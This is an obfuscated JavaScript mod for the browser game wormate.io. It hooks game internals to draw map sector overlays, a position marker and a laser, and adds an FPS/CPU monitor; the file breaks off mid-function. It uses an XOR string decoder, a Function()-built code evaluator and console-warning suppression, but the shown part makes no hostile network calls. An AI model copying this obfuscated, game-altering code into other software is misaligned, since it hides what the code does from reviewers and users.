var GoogleAuth;
var zE;
const originalWarn = console.warn;
console.warn = function (..._0x19ff58) {
  const _0xaf9469 = _0x19ff58.join(" ");
  const _0x4f3920 = ["[Violation]", "Permissions-Policy", "requestAnimationFrame", "deprecated", "gsi/web/guides/gis-migration"];
  if (_0x4f3920.some(_0x3b29f0 => _0xaf9469.includes(_0x3b29f0))) {
    return;
  }
  originalWarn.apply(console, _0x19ff58);
};
window.sectorSystem = {
  settings: {
    lineWidth: 0.15,
    lineColor: 16711680,
    lineAlpha: 0.3,
    backgroundColor: 0,
    backgroundAlpha: 0.6,
    sectorTextStyle: {
      fontFamily: "Arial",
      fontSize: 14,
      fill: 16777215
    },
    quarterTextStyle: {
      fontFamily: "Arial",
      fontSize: 20,
      fill: 16777215
    },
    showLines: true
  },
  state: {
    container: null,
    graphics: null,
    isActive: true,
    currentMode: "sectors",
    texts: [],
    initialized: false,
    renderContainer: null,
    restored: false
  },
  findRenderContainer: function () {
    if (this.state.renderContainer) {
      return this.state.renderContainer;
    }
    if (window.laserGraphics?.parent) {
      this.state.renderContainer = window.laserGraphics.parent;
      return this.state.renderContainer;
    }
    if (window.ooo?.Mh?.Lh?.Wf) {
      this.state.renderContainer = window.ooo.Mh.Lh.Wf;
      return this.state.renderContainer;
    }
    const _0x3c0f89 = (_0x520f39, _0x21e547 = new Set(), _0x2174dc = 0) => {
      if (!_0x520f39 || typeof _0x520f39 !== "object" || _0x2174dc > 3 || _0x21e547.has(_0x520f39)) {
        return null;
      }
      _0x21e547.add(_0x520f39);
      if (_0x520f39.Wf instanceof PIXI.Container) {
        this.state.renderContainer = _0x520f39.Wf;
        return _0x520f39.Wf;
      }
      for (let _0x69d39e in _0x520f39) {
        if (_0x69d39e !== "parent" && _0x69d39e !== "children" && _0x520f39[_0x69d39e] && typeof _0x520f39[_0x69d39e] === "object") {
          const _0x45a3ff = _0x3c0f89(_0x520f39[_0x69d39e], _0x21e547, _0x2174dc + 1);
          if (_0x45a3ff) {
            return _0x45a3ff;
          }
        }
      }
      return null;
    };
    return _0x3c0f89(window.ooo);
  },
  cachedRadius: 0,
  lastRadiusTime: 0,
  getRadius: function () {
    const _0x30781c = Date.now();
    if (_0x30781c - this.lastRadiusTime > 1000) {
      this.cachedRadius = window.ooo?.Mh?.Qh?.gh || window.ooo?.Mh?.Lh?.Qh?.gh || 500;
      this.lastRadiusTime = _0x30781c;
    }
    return this.cachedRadius;
  },
  clearTexts: function () {
    this.state.texts.forEach(_0x553989 => {
      if (_0x553989 && _0x553989.parent) {
        _0x553989.parent.removeChild(_0x553989);
      }
    });
    this.state.texts = [];
  },
  initDrawing: function (_0x53d8da) {
    this.clearTexts();
    this.state.graphics.clear();
    this.state.graphics.lineStyle(this.settings.lineWidth, this.settings.lineColor, this.settings.lineAlpha);
    this.state.graphics.beginFill(this.settings.backgroundColor, this.settings.backgroundAlpha);
    this.state.graphics.drawCircle(0, 0, _0x53d8da);
    this.state.graphics.endFill();
    return _0x53d8da;
  },
  drawSectors: function () {
    const _0x3d6378 = this.initDrawing(this.getRadius());
    const _0x53eaa1 = _0x3d6378 / 3;
    if (this.settings.showLines) {
      for (let _0xd6f0de = 1; _0xd6f0de < 3; _0xd6f0de++) {
        this.state.graphics.drawCircle(0, 0, _0x3d6378 - _0xd6f0de * _0x53eaa1);
      }
      for (let _0x527174 = 0; _0x527174 < 4; _0x527174++) {
        const _0x4eca67 = _0x527174 * Math.PI / 2;
        this.state.graphics.moveTo(0, 0);
        this.state.graphics.lineTo(Math.cos(_0x4eca67) * _0x3d6378, Math.sin(_0x4eca67) * _0x3d6378);
      }
    }
    for (let _0x1cdb18 = 0; _0x1cdb18 < 4; _0x1cdb18++) {
      const _0x3148d7 = _0x1cdb18 * Math.PI / 2;
      for (let _0x4ae530 = 0; _0x4ae530 < 3; _0x4ae530++) {
        const _0x56e8c1 = _0x3d6378 - (_0x4ae530 * _0x53eaa1 + _0x53eaa1 / 2);
        const _0x5db191 = _0x3148d7 + Math.PI / 4;
        const _0x1f2ef9 = ["S", "D", "F"][_0x4ae530] + (_0x1cdb18 + 1);
        const _0x2116f8 = new PIXI.Text(_0x1f2ef9, this.settings.sectorTextStyle);
        _0x2116f8.anchor.set(0.5);
        _0x2116f8.position.set(Math.cos(_0x5db191) * _0x56e8c1, Math.sin(_0x5db191) * _0x56e8c1);
        this.state.container.addChild(_0x2116f8);
        this.state.texts.push(_0x2116f8);
      }
    }
  },
  drawQuarters: function () {
    const _0x478128 = this.initDrawing(this.getRadius());
    if (this.settings.showLines) {
      this.state.graphics.moveTo(-_0x478128, 0);
      this.state.graphics.lineTo(_0x478128, 0);
      this.state.graphics.moveTo(0, -_0x478128);
      this.state.graphics.lineTo(0, _0x478128);
    }
    [{
      n: "UP 1",
      x: 1,
      y: -1
    }, {
      n: "UP 2",
      x: -1,
      y: -1
    }, {
      n: "UP 3",
      x: -1,
      y: 1
    }, {
      n: "UP 4",
      x: 1,
      y: 1
    }].forEach(_0x495064 => {
      const _0x5668e2 = new PIXI.Text(_0x495064.n, this.settings.quarterTextStyle);
      _0x5668e2.anchor.set(0.5);
      _0x5668e2.position.set(_0x495064.x * _0x478128 / 3, _0x495064.y * _0x478128 / 3);
      this.state.container.addChild(_0x5668e2);
      this.state.texts.push(_0x5668e2);
    });
  },
  initGraphics: function () {
    if (this.state.initialized) {
      return true;
    }
    const _0x1c12f8 = this.findRenderContainer();
    if (!_0x1c12f8) {
      return false;
    }
    this.state.container = new PIXI.Container();
    this.state.graphics = new PIXI.Graphics();
    this.state.container.addChild(this.state.graphics);
    _0x1c12f8.addChild(this.state.container);
    this.state.container.zIndex = 10;
    this.state.container.visible = false;
    this.state.initialized = true;
    return true;
  },
  toggleMode: function (_0x41150d) {
    if (!this.initGraphics()) {
      return;
    }
    if (this.state.isActive && this.state.currentMode === _0x41150d) {
      this.state.container.visible = false;
      this.state.isActive = false;
      this.state.currentMode = null;
      if (document.getElementById("sector_system_toggle")) {
        document.getElementById("sector_system_toggle").checked = false;
      }
      this.saveSettings();
      return;
    }
    this.state.isActive = true;
    this.state.currentMode = _0x41150d;
    this.state.container.visible = true;
    if (document.getElementById("sector_system_toggle")) {
      document.getElementById("sector_system_toggle").checked = true;
    }
    if (_0x41150d === "sectors") {
      this.drawSectors();
    } else {
      this.drawQuarters();
    }
    this.saveSettings();
  },
  setupKeyboardEvents: function () {
    const _0x233ea1 = {
      83: () => this.toggleMode("sectors"),
      187: () => this.toggleMode("sectors"),
      61: () => this.toggleMode("sectors"),
      88: () => this.toggleMode("quarters")
    };
    document.addEventListener("keydown", _0x55e114 => {
      if (document.activeElement.id === "mm-params-nickname") {
        return;
      }
      const _0x2fe99e = _0x55e114.keyCode || _0x55e114.which;
      if (_0x233ea1[_0x2fe99e]) {
        _0x233ea1[_0x2fe99e]();
        if (typeof this.initUserInterface === "function") {
          this.initUserInterface();
        }
      }
    });
  },
  saveSettings: function () {
    try {
      localStorage.setItem("sectorSystemSettings", JSON.stringify(this.settings));
      localStorage.setItem("sectorSystemActive", this.state.isActive ? "1" : "0");
      if (this.state.currentMode) {
        localStorage.setItem("sectorSystemMode", this.state.currentMode);
      }
    } catch (_0x476ea5) {
      console.error("Error saving sector system settings:", _0x476ea5);
    }
  },
  loadSettings: function () {
    try {
      const _0x2590df = JSON.parse(localStorage.getItem("sectorSystemSettings"));
      if (_0x2590df) {
        this.settings = {
          ...this.settings,
          ..._0x2590df
        };
      }
      const _0x3626f3 = localStorage.getItem("sectorSystemActive") === "1";
      let _0x3e678e = localStorage.getItem("sectorSystemMode");
      if (!_0x3e678e) {
        _0x3e678e = "sectors";
      }
      this.savedState = {
        isActive: _0x3626f3,
        currentMode: _0x3e678e
      };
    } catch (_0x2264f9) {
      console.error("Error loading sector system settings:", _0x2264f9);
    }
  },
  applySettings: function () {
    if (this.state.isActive && this.state.currentMode) {
      if (this.state.currentMode === "sectors") {
        this.drawSectors();
      } else {
        this.drawQuarters();
      }
    }
  },
  init: function () {
    if (typeof PIXI === "undefined") {
      setTimeout(() => this.init(), 1000);
      return;
    }
    this.loadSettings();
    const _0x55cf68 = this.initGraphics();
    this.setupKeyboardEvents();
    if (!_0x55cf68) {
      setTimeout(() => this.init(), 1000);
      return;
    }
    setTimeout(() => {
      if (this.savedState && this.savedState.isActive) {
        this.state.isActive = true;
        this.state.currentMode = this.savedState.currentMode;
        this.state.container.visible = true;
        if (this.state.currentMode === "sectors") {
          this.drawSectors();
        } else {
          this.drawQuarters();
        }
        if (document.getElementById("sector_system_toggle")) {
          document.getElementById("sector_system_toggle").checked = true;
        }
        this.state.restored = true;
        if ($("#sector_system_toggle").length > 0) {
          this.initUserInterface();
        }
      }
    }, 1000);
  },
  initUserInterface: function () {
    function _0x4325f4(_0x4cacdc) {
      return "#" + _0x4cacdc.toString(16).padStart(6, "0");
    }
    function _0xcf3d08(_0x1a1fef) {
      return parseInt(_0x1a1fef.replace("#", ""), 16);
    }
    if (!this.state.restored && this.savedState && this.savedState.isActive) {
      this.toggleMode(this.savedState.currentMode || "sectors");
      this.state.restored = true;
    }
    const _0x32fc2d = () => {
      $("#sector_system_toggle").prop("checked", this.state.isActive);
      $("#sector_display_mode").val(this.state.currentMode || "sectors");
      $("#sector_bg_color").val(_0x4325f4(this.settings.backgroundColor));
      $("#sector_line_color").val(_0x4325f4(this.settings.lineColor));
      $("#sector_bg_opacity").val(this.settings.backgroundAlpha * 100);
      $("#sector_bg_opacity_value").text(Math.round(this.settings.backgroundAlpha * 100) + "%");
      $("#sector_line_opacity").val(this.settings.lineAlpha * 100);
      $("#sector_line_opacity_value").text(Math.round(this.settings.lineAlpha * 100) + "%");
      $("#sector_show_lines").prop("checked", this.settings.showLines);
      if (!this.settings.showLines) {
        $("#sector_lines_options").slideUp(200);
      } else {
        $("#sector_lines_options").slideDown(200);
      }
      if (this.state.isActive) {
        $("#sector_settings_panel").slideDown(300);
      } else {
        $("#sector_settings_panel").slideUp(200);
      }
    };
    $("#sector_system_toggle").off("change").on("change", function () {
      const _0x5bb3bf = $(this).prop("checked");
      if (_0x5bb3bf) {
        const _0x124f19 = $("#sector_display_mode").val() || "sectors";
        window.sectorSystem.toggleMode(_0x124f19);
      } else if (window.sectorSystem.state.isActive) {
        window.sectorSystem.toggleMode(window.sectorSystem.state.currentMode);
      }
      _0x32fc2d();
    });
    $("#sector_display_mode").off("change").on("change", function () {
      const _0xeec517 = $(this).val();
      if (window.sectorSystem.state.isActive) {
        window.sectorSystem.toggleMode(window.sectorSystem.state.currentMode);
        window.sectorSystem.toggleMode(_0xeec517);
        _0x32fc2d();
      }
    });
    $("#sector_bg_color").off("change").on("change", function () {
      window.sectorSystem.settings.backgroundColor = _0xcf3d08($(this).val());
      window.sectorSystem.applySettings();
      window.sectorSystem.saveSettings();
    });
    $("#sector_line_color").off("change").on("change", function () {
      window.sectorSystem.settings.lineColor = _0xcf3d08($(this).val());
      window.sectorSystem.applySettings();
      window.sectorSystem.saveSettings();
    });
    $("#sector_bg_opacity").off("input").on("input", function () {
      const _0x1bb33b = parseInt($(this).val()) / 100;
      window.sectorSystem.settings.backgroundAlpha = _0x1bb33b;
      $("#sector_bg_opacity_value").text(Math.round(_0x1bb33b * 100) + "%");
      window.sectorSystem.applySettings();
      window.sectorSystem.saveSettings();
    });
    $("#sector_line_opacity").off("input").on("input", function () {
      const _0x4c3d31 = parseInt($(this).val()) / 100;
      window.sectorSystem.settings.lineAlpha = _0x4c3d31;
      $("#sector_line_opacity_value").text(Math.round(_0x4c3d31 * 100) + "%");
      window.sectorSystem.applySettings();
      window.sectorSystem.saveSettings();
    });
    $("#sector_show_lines").off("change").on("change", function () {
      window.sectorSystem.settings.showLines = $(this).prop("checked");
      if (!window.sectorSystem.settings.showLines) {
        $("#sector_lines_options").slideUp(200);
      } else {
        $("#sector_lines_options").slideDown(200);
      }
      window.sectorSystem.applySettings();
      window.sectorSystem.saveSettings();
    });
    _0x32fc2d();
  }
};
var StoreSkinID;
$(document).ready(function () {
  if ($(".store-view-cont").length) {
    $(".store-view-cont").append("<div id=\"idReplaceSkin\"></div>");
    StoreSkinID = $("#idReplaceSkin");
  }
});
window.laserOptions = {
  enabled: true,
  color: 16766720,
  opacity: 0.5,
  thickness: 0.1
};
window.laserGraphics = null;
const ctx = {
  fontStyle: {
    blanco: new PIXI.TextStyle({
      align: "center",
      fill: "#FF0000",
      fontSize: 14,
      fontWeight: "bold",
      lineJoin: "round",
      stroke: "#FFFFFF",
      strokeThickness: 1.5,
      whiteSpace: "normal",
      wordWrap: true
    })
  }
};
ctx.pointsContainer = new PIXI.Container();
let lastKnownCoords = {
  x: null,
  y: null
};
let blinkTimerId = null;
let removeMarkTimerId = null;
const createCircle = function () {
  if (!window.coords || typeof window.coords.playerX === "undefined" || typeof window.coords.playerY === "undefined") {
    return;
  }
  let _0x552b08 = "m_2";
  if (lastKnownCoords.x !== null) {
    const _0xb9a4b1 = Math.sqrt(Math.pow(window.coords.playerX - lastKnownCoords.x, 2) + Math.pow(window.coords.playerY - lastKnownCoords.y, 2));
    if (_0xb9a4b1 > 100) {
      if (ctx[_0x552b08]) {
        if (ctx.pointsContainer && ctx.pointsContainer.children.includes(ctx[_0x552b08])) {
          ctx.pointsContainer.removeChild(ctx[_0x552b08]);
        }
        ctx[_0x552b08] = null;
      }
      if (blinkTimerId) {
        clearInterval(blinkTimerId);
        blinkTimerId = null;
      }
      if (removeMarkTimerId) {
        clearTimeout(removeMarkTimerId);
        removeMarkTimerId = null;
      }
    }
  }
  lastKnownCoords.x = window.coords.playerX;
  lastKnownCoords.y = window.coords.playerY;
  if (!ctx[_0x552b08]) {
    ctx[_0x552b08] = new PIXI.Text("X", ctx.fontStyle.blanco);
    ctx[_0x552b08].zIndex = 2;
    ctx[_0x552b08].alpha = 0.9;
    ctx[_0x552b08].anchor.set(0.5, 0.5);
    if (ctx.pointsContainer) {
      ctx.pointsContainer.sortableChildren = true;
      ctx.pointsContainer.zIndex = 2;
    }
    if (!blinkTimerId) {
      let _0x3f0f32 = true;
      blinkTimerId = setInterval(() => {
        if (ctx[_0x552b08]) {
          _0x3f0f32 = !_0x3f0f32;
          ctx[_0x552b08].visible = _0x3f0f32;
        } else {
          clearInterval(blinkTimerId);
          blinkTimerId = null;
        }
      }, 500);
    }
    if (!removeMarkTimerId) {
      removeMarkTimerId = setTimeout(() => {
        if (ctx[_0x552b08]) {
          if (ctx.pointsContainer && ctx.pointsContainer.children.includes(ctx[_0x552b08])) {
            ctx.pointsContainer.removeChild(ctx[_0x552b08]);
          }
          ctx[_0x552b08] = null;
        }
        if (blinkTimerId) {
          clearInterval(blinkTimerId);
          blinkTimerId = null;
        }
        removeMarkTimerId = null;
      }, 20000);
    }
  }
  if (ctx[_0x552b08]) {
    ctx[_0x552b08].x = window.coords.playerX;
    ctx[_0x552b08].y = window.coords.playerY;
    if (ctx.pointsContainer && !ctx.pointsContainer.children.includes(ctx[_0x552b08])) {
      ctx.pointsContainer.addChild(ctx[_0x552b08]);
    }
  }
  if (window.ooo && ooo.Xg && ooo.Xg.Kf && ooo.Xg.Kf.Wg && ooo.Xg.Kf.Wg.Ah && ooo.Xg.Kf.Wg.Ah.Sh) {
    ooo.Xg.Kf.Wg.Ah.Sh.zIndex = 9999;
    if (ooo.Xg.Kf.Wg.Ah.sortableChildren !== true) {
      ooo.Xg.Kf.Wg.Ah.sortableChildren = true;
    }
    if (ooo.Xg.Kf.Wg.sortableChildren !== true) {
      ooo.Xg.Kf.Wg.sortableChildren = true;
    }
  }
};
function _typeof(_0x37ddc2) {
  return (_typeof = typeof Symbol == "function" && typeof Symbol.iterator == "symbol" ? function (_0x214c16) {
    return typeof _0x214c16;
  } : function (_0xaf1a59) {
    if (_0xaf1a59 && typeof Symbol == "function" && _0xaf1a59.constructor === Symbol && _0xaf1a59 !== Symbol.prototype) {
      return "symbol";
    } else {
      return typeof _0xaf1a59;
    }
  })(_0x37ddc2);
}
(function () {
  var _0x7f096e = {};
  var _0x494ea6 = {};
  var _0x331039 = {};
  var _0x4ead11 = {};
  _0x331039.a = function (_0x3b1541) {
    var _0x20093d = new String();
    var _0x1a1d23 = parseInt(_0x3b1541.substring(0, 2), 16);
    for (var _0x488dd5 = 2; _0x488dd5 < _0x3b1541.length; _0x488dd5 += 2) {
      var _0x46c042 = parseInt(_0x3b1541.substring(_0x488dd5, _0x488dd5 + 2), 16);
      _0x20093d += String.fromCharCode(_0x46c042 ^ (_0x1a1d23 = 3793 + _0x1a1d23 * 4513 & 255));
    }
    ;
    return _0x20093d;
  };
  _0x331039.b = function (_0x2a42b4) {
    return Function(`return ${_0x2a42b4}; `)();
  };
  _0x7f096e.c = _0x331039.b("window");
  _0x7f096e.d = _0x7f096e.c.document;
  _0x331039.e = function () {
    return _0x7f096e.c.devicePixelRatio || 1;
  };
  _0x7f096e.c.addEventListener("load", function () {
    let _0x5c2dcc = {
      eie: null,
      joystick: {
        positionMode: "L",
        checked: true,
        size: 90,
        mode: "dynamic",
        position: {
          left: "110px",
          bottom: "110px"
        },
        color: "red",
        pxy: 110
      },
      on: true,
      vj: null,
      uj: null,
      m: null,
      n: null
    };
    let _0x207b06 = {
      s_l: "https://wormup.in",
      eat_animation: 0.0025,
      smoothCamera: 0.5,
      PortionSize: 2,
      PortionAura: 1.2,
      PortionTransparent: 0.8,
      FoodTransparent: 0.3,
      FoodSize: 2,
      FoodShadow: 2,
      zoomSpeed: 0.003,
      soundEnabled: true,
      soundVolume: 50,
      soundEffect: "https://wormateup.live/images/store/hs_2.mp3",
      bannedWordsEnabled: true,
      bannedWords: [],
      fullscreen: null,
      headshot: 0,
      s_headshot: 0,
      mobile: false,
      mo: 1,
      mo1: {
        x: -1,
        y: -1
      },
      mo2: {
        x: -1,
        y: -1
      },
      s_kill: 0,
      kill: 0,
      died: 0,
      saveGame: true,
      pm: {},
      joystick: {
        checked: true,
        color: "red",
        mode: "dynamic",
        pxy: 110
      },
      j: null,
      pk: 0,
      pk0: "",
      pk1: "",
      pk2: "",
      pk3: "",
      pk4: "",
      pk5: "",
      pk6: "",
      z: 1,
      c_v: 222,
      c_1: "UP",
      c_2: "TeamUP",
      c_3: "wormup",
      c_4: "wormate.io",
      c_5: "please don't copy my code",
      d_1: "VlZBPQ==",
      d_2: "VkdWaGJWVlE=",
      d_3: "ZDI5eWJYVnc=",
      d_4: "VjI5eWJXRjBaUzVwYnc9PQ==",
      d_5: "VUd4bFlYTmxJR1J2YmlkMElHTnZjSGtnYlhrZ1kyOWtaUT09",
      a: 0,
      b: 0,
      c: 0,
      d: 0,
      e: 0,
      f: "",
      g: 36,
      s_w: true,
      s_n: "",
      v_z: 0,
      h: true,
      sn: true,
      s: true,
      hz: true,
      fz: true,
      tt: true,
      vh: true,
      vp: true,
      iq: true,
      ctrl: false,
      r1: true,
      sc: 0,
      wi: 0,
      to: 10,
      sm: 20,
      pi: "",
      pn: "",
      se: {
        a: [],
        b: [],
        c: [],
        d: [],
        e: [],
        f: [],
        g: [],
        h: [],
        i: [],
        j: [],
        k: []
      },
      st: true,
      hh: 0,
      sh: [],
      ws: [],
      we: [],
      wm: [],
      wg: [],
      wh: [],
      sg: [],
      gg: null,
      ig: -1,
      so: 1,
      re: true,
      dg: null,
      ls: true,
      cs: true,
      showKillName: true,
      showHeadshotName: true,
      killMsg: "KILLED",
      headshotMsg: "HEADSHOT",
      killNamePos: "after",
      headshotNamePos: "after",
      headshotCustomText: "",
      headshotMsgType: "default"
    };
    window.gameSettings = _0x207b06;
    function _0xe8d0c() {
      for (let _0x2bece7 in ooo.Mh.li) {
        let _0x35f850 = ooo.Mh.li[_0x2bece7];
        if (_0x35f850 && _0x35f850.wn && _0x35f850.originalName) {
          let _0x120360 = _0x31650d(_0x35f850.originalName, false);
          _0x35f850.wn.text = _0x120360;
        }
      }
    }
    window.PerformanceMonitor = {
      lastTime: performance.now(),
      frameCount: 0,
      fps: 0,
      cpuUsage: 0,
      fpsDisplay: null,
      cpuDisplay: null,
      isFpsVisible: true,
      isCpuVisible: true,
      cpuSamples: [],
      cpuSampleSize: 10,
      lastCpuTime: 0,
      isInitialized: false,
      _cpuMonitoringInterval: null,
      _animFrameId: null,
      init() {
        if (this.isInitialized) {
          return;
        }
        this.isInitialized = true;
        const _0x237323 = localStorage.getItem("showFpsCpu");
        if (_0x237323 !== null) {
          this.isFpsVisible = _0x237323 === "true";
          this.isCpuVisible = _0x237323 === "true";
        }
        this.createDisplayElements();
        if (this.isFpsVisible || this.isCpuVisible) {
          this.startAllMonitoring();
        }
        this.setupKeyboardControls();
        this.updateDisplays();
        this.setupToggleButton();
      },
      startAllMonitoring() {
        if (this.isFpsVisible && !this._animFrameId) {
          this.startMonitoring();
        }
        if (this.isCpuVisible && !this._cpuMonitoringInterval) {
          this.startCpuMonitoring();
        }
      },
      stopAllMonitoring() {
        if (this._cpuMonitoringInterval) {
          clearInterval(this._cpuMonitoringInterval);
          this._cpuMonitoringInterval = null;
        }
        if (this._animFrameId) {
          cancelAnimationFrame(this._animFrameId);
          this._animFrameId = null;
        }
      },
      setupToggleButton() {
        const _0x12ad92 = document.getElementById("performance-monitor-toggle");
        if (_0x12ad92) {
          _0x12ad92.checked = this.isFpsVisible || this.isCpuVisible;
          _0x12ad92.addEventListener("change", () => {
            const _0x3f04f0 = _0x12ad92.checked;
            this.toggle(_0x3f04f0);
          });
        } else {
          setTimeout(() => {
            const _0x213b87 = document.getElementById("performance-monitor-toggle");
            if (_0x213b87) {
              _0x213b87.checked = this.isFpsVisible || this.isCpuVisible;
              _0x213b87.addEventListener("change", () => {
                this.toggle(_0x213b87.checked);
              });
            }
          }, 1000);
        }
      },
      createDisplayElements() {
        const _0x492b3e = document.getElementById("performance-monitor-style");
        if (!_0x492b3e) {
          const _0xbff973 = document.createElement("style");
          _0xbff973.id = "performance-monitor-style";
          _0xbff973.textContent = "\n                .performance-monitor-container {\n                    position: fixed;\n                    right: 5px;\n                    bottom: 5px;\n                    display: flex;\n                    gap: 5px;\n                    z-index: 9999;\n                    font-family: Arial, sans-serif;\n                    pointer-events: none;\n                    user-select: none;\n                }\n                .monitor-element {\n                    background-color: rgba(0, 0, 0, 0.5);\n                    font-size: 12px;\n                    height: 20px;\n                    line-height: 20px;\n                    border-radius: 4px;\n                    font-weight: bold;\n                    text-shadow: 1px 1px 2px rgba(0,0,0,0.5);\n                    padding: 0 8px;\n                    white-space: nowrap;\n                    box-sizing: border-box;\n                    display: none;\n                }\n            ";
          document.head.appendChild(_0xbff973);
        }
        let _0x2f58af = document.querySelector(".performance-monitor-container");
        if (!_0x2f58af) {
          _0x2f58af = document.createElement("div");
          _0x2f58af.className = "performance-monitor-container";
          document.body.appendChild(_0x2f58af);
        }
        if (!this.fpsDisplay) {
          this.fpsDisplay = document.createElement("div");
          this.fpsDisplay.className = "monitor-element";
          _0x2f58af.appendChild(this.fpsDisplay);
        }
        if (!this.cpuDisplay) {
          this.cpuDisplay = document.createElement("div");
          this.cpuDisplay.className = "monitor-element";
          _0x2f58af.appendChild(this.cpuDisplay);
        }
      },
      startCpuMonitoring() {
        if (!this.isCpuVisible) {
          return;
        }
        if (this._cpuMonitoringInterval) {
          clearInterval(this._cpuMonitoringInterval);
        }
        this.lastCpuTime = performance.now();
        this.cpuSamples = [];
        this._cpuMonitoringInterval = setInterval(() => {
          if (!this.isCpuVisible) {
            clearInterval(this._cpuMonitoringInterval);
            this._cpuMonitoringInterval = null;
            return;
          }
          this.measureCpuUsage();
        }, 500);
      },
      measureCpuUsage() {
        const _0x402bf4 = performance.now();
        const _0x4bb6dd = _0x402bf4 - this.lastCpuTime;
        const _0x14433e = 60;
        const _0x36bd26 = Math.max(0, _0x14433e - this.fps) / _0x14433e;
        let _0x4c5e15 = 0;
        if (window.performance && window.performance.timing) {
          const _0x3f46f9 = window.performance.timing;
          _0x4c5e15 = _0x3f46f9.domComplete - _0x3f46f9.navigationStart;
        }
        const _0x2c08ab = Math.min(1, window.anApp ? 0.7 : 0.3);
        const _0xa6f6f6 = Math.min(100, Math.round((_0x36bd26 * 70 + _0x4c5e15 / 1000 * 30) * _0x2c08ab));
        this.cpuSamples.push(_0xa6f6f6);
        if (this.cpuSamples.length > this.cpuSampleSize) {
          this.cpuSamples.shift();
        }
        this.cpuUsage = Math.round(this.cpuSamples.reduce((_0x50dc51, _0x1dcdf3) => _0x50dc51 + _0x1dcdf3, 0) / this.cpuSamples.length);
        this.lastCpuTime = _0x402bf4;
        this.updateDisplays();
      },
      startMonitoring() {
        if (!this.isFpsVisible) {
          return;
        }
        if (this._animFrameId) {
          cancelAnimationFrame(this._animFrameId);
        }
        const _0x139829 = () => {
          if (!this.isFpsVisible) {
            cancelAnimationFrame(this._animFrameId);
            this._animFrameId = null;
            return;
          }
          const _0x4ac56f = performance.now();
          const _0x5cba2d = _0x4ac56f - this.lastTime;
          this.frameCount++;
          if (_0x5cba2d >= 1000) {
            this.fps = Math.round(this.frameCount * 1000 / _0x5cba2d);
            this.frameCount = 0;
            this.lastTime = _0x4ac56f;
            this.updateDisplays();
          }
          this._animFrameId = requestAnimationFrame(_0x139829);
        };
        this._animFrameId = requestAnimationFrame(_0x139829);
      },
      updateDisplays() {
        if (!this.fpsDisplay || !this.cpuDisplay) {
          return;
        }
        if (this.isFpsVisible) {
          this.fpsDisplay.textContent = "FPS: " + this.fps;
          if (this.fps >= 58) {
            this.fpsDisplay.style.color = "white";
          } else if (this.fps >= 30) {
            this.fpsDisplay.style.color = "gold";
          } else {
            this.fpsDisplay.style.color = "red";
          }
          this.fpsDisplay.style.display = "block";
        } else {
          this.fpsDisplay.style.display = "none";
        }
        if (this.isCpuVisible) {
          this.cpuDisplay.textContent = "CPU: " + this.cpuUsage + "%";
          if (this.cpuUsage <= 50) {
            this.cpuDisplay.style.color = "white";
          } else if (this.cpuUsage <= 80) {
            this.cpuDisplay.style.color = "gold";
          } else {
            this.cpuDisplay.style.color = "red";
          }
          this.cpuDisplay.style.display = "block";
        } else {
          this.cpuDisplay.style.display = "none";
        }
      },
      setupKeyboardControls() {
        if (this._hasSetupKeyboardControls) {
          return;
        }
        this._hasSetupKeyboardControls = true;
        document.addEventListener("keydown", _0x248015 => {
          if (_0x248015.key === "F2" || _0x248015.code === "F2" || _0x248015.keyCode === 113) {
            _0x248015.preventDefault();
            this.isCpuVisible = !this.isCpuVisible;
            if (this.isCpuVisible && !this._cpuMonitoringInterval) {
              this.startCpuMonitoring();
            }
            this.saveSettings();
            this.updateDisplays();
            this.updateToggleButton();
            return false;
          } else if (_0x248015.key === "F4" || _0x248015.code === "F4" || _0x248015.keyCode === 115) {
            _0x248015.preventDefault();
            this.isFpsVisible = !this.isFpsVisible;
            if (this.isFpsVisible && !this._animFrameId) {
              this.startMonitoring();
            }
            this.saveSettings();
            this.updateDisplays();
            this.updateToggleButton();
            return false;
          } else if (_0x248015.altKey && (_0x248015.key === "2" || _0x248015.keyCode === 50)) {
            _0x248015.preventDefault();
            this.isCpuVisible = !this.isCpuVisible;
            if (this.isCpuVisible && !this._cpuMonitoringInterval) {
              this.startCpuMonitoring();
            }
            this.saveSettings();
            this.updateDisplays();
            this.updateToggleButton();
            return false;
          } else if (_0x248015.altKey && (_0x248015.key === "4" || _0x248015.keyCode === 52)) {
            _0x248015.preventDefault();
            this.isFpsVisible = !this.isFpsVisible;
            if (this.isFpsVisible && !this._animFrameId) {
              this.startMonitoring();
            }
            this.saveSettings();
            this.updateDisplays();
            this.updateToggleButton();
            return false;
          }
        }, true);
      },
      saveSettings() {
        const _0x1d3e2f = this.isFpsVisible || this.isCpuVisible;
        localStorage.setItem("showFpsCpu", _0x1d3e2f);
      },
      updateToggleButton() {
        const _0x55b606 = document.getElementById("performance-monitor-toggle");
        if (_0x55b606) {
          _0x55b606.checked = this.isFpsVisible || this.isCpuVisible;
        }
      },
      toggle(_0x1d0aaa) {
        if (typeof _0x1d0aaa !== "boolean") {
          _0x1d0aaa = !this.isFpsVisible && !this.isCpuVisible;
        }
        const _0x29bce9 = this.isFpsVisible;
        const _0x520820 = this.isCpuVisible;
        this.isFpsVisible = _0x1d0aaa;
        this.isCpuVisible = _0x1d0aaa;
        this.saveSettings();
        if (_0x1d0aaa) {
          if (!_0x29bce9 && this.isFpsVisible) {
            this.startMonitoring();
          }
          if (!_0x520820 && this.isCpuVisible) {
            this.startCpuMonitoring();
          }
        } else {
          this.stopAllMonitoring();
        }
        this.updateDisplays();
      },
      enable(_0x4fad70) {
        if (_0x4fad70) {
          if (!this.isInitialized) {
            this.init();
          } else {
            this.toggle(true);
          }
        } else {
          this.toggle(false);
        }
      }
    };
    let _0x299529 = localStorage.getItem("SaveGameup");
    if (_0x299529 && _0x299529 !== "null") {
      let _0x7e87dc = JSON.parse(_0x299529);
      for (let _0x363711 in _0x7e87dc) {
        _0x207b06[_0x363711] = _0x7e87dc[_0x363711];
      }
    }
    ;
    if (!_0x207b06.favoriteSkins) {
      _0x207b06.favoriteSkins = [];
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    }
    if (_0x207b06.currentFavSkinIndex === undefined) {
      _0x207b06.currentFavSkinIndex = 0;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    }
    if (!_0x207b06.selectedHats) {
      _0x207b06.selectedHats = [];
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    }
    if (_0x207b06.currentHatIndex === undefined) {
      _0x207b06.currentHatIndex = 0;
      localStorage.setItem("SaveGameup", JSON.stringify(_0x207b06));
    }
    if (!window.globalHatTextureCache) {
      window.globalHatTextureCache = {};
    }
    let _0x2964bf = function () {
      let _0x407d4a = false;
      _0x207b06.mobile = false;
